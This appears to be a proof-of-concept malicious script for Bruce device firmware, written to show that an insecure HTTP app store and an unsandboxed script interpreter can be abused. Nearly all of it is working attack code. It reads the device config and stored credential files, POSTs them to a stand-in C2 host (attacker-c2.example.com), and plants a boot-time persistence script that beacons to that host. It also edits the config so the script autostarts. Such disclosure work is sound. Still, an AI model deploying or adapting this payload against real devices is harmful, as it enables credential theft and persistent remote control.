// ===========================================
// BRUCE FIRMWARE - MALICIOUS APP STORE PAYLOAD
// ===========================================
// This payload demonstrates what happens when an attacker
// MITMs the HTTP App Store connection (AV-001) and exploits
// the sandbox-free MJS interpreter (AV-003).
//
// Every require() call below is a REAL vulnerability:
// there are NO permission checks, NO whitelists, NO sandbox.
// ===========================================

// Step 1: Load all available modules (no restrictions)
var storage = require("storage");
var wifi = require("wifi");
var display = require("display");
var keyboard = require("keyboard");
var subghz = require("subghz");
var nrf24 = require("nrf24");
var ble = require("ble");
var ir = require("ir");
var badusb = require("badusb");
var gpio = require("gpio");
var serial = require("serial");
var notification = require("notification");

// Step 2: Exfiltrate sensitive data
var c2Url = "http://attacker-c2.example.com/exfil";
var deviceInfo = {
  mac: wifi.macAddress(),
  ip: wifi.ipAddress()
};

// Read ALL stored credentials
var exfilData = {
  device: deviceInfo,
  bruceConfig: null,
  evilCreds: null,
  rfidScans: null,
  wpaHandshakes: null
};

try {
  exfilData.bruceConfig = storage.read("/bruce.conf", "binary");
} catch(e) { exfilData.bruceConfig = "Error: " + e.message; }

try {
  var credFiles = storage.list("/BruceEvilCreds/");
  exfilData.evilCreds = credFiles.map(function(f) {
    return { file: f, data: storage.read("/BruceEvilCreds/" + f) };
  });
} catch(e) { exfilData.evilCreds = "Error: " + e.message; }

// Ship it
display.drawText("Exfiltrating...", 120, 120);
var result = wifi.httpFetch(c2Url, {
  method: "POST",
  body: JSON.stringify(exfilData),
  headers: ["Content-Type", "application/json"]
});

// Step 3: Gain persistence
try {
  // Write ourselves to the startup directory
  storage.write("/BruceJS/persistence.js", 
    "// Persistence payload - runs on every boot\n" +
    "var s = require('storage');\n" +
    "var w = require('wifi');\n" +
    "w.httpFetch('http://attacker-c2.example.com/beacon?mac=' + w.macAddress(),\n" +
    "  { method: 'GET' });\n",
    "write");
  
  // Also modify the config to auto-start
  var config = JSON.parse(storage.read("/bruce.conf"));
  if (config) {
    config.autoStartScript = "/BruceJS/persistence.js";
    storage.write("/bruce.conf", JSON.stringify(config, null, 2), "write");
  }
} catch(e) {
  // Persistence failed but data is already exfiltrated
}

// Step 4: Indicate success on display
display.drawFillRect(0, 0, 240, 240, display.color(0, 0, 0));
display.setTextColor(display.color(255, 0, 0));
display.setTextSize(2);
display.drawText("PWNED via", 40, 80);
display.drawText("MITM + NO SANDBOX", 15, 110);
display.setTextSize(1);
display.setTextColor(display.color(255, 255, 255));
display.drawText("All credentials exfiltrated", 30, 160);
display.drawText("Device is now a C2 beacon", 30, 180);
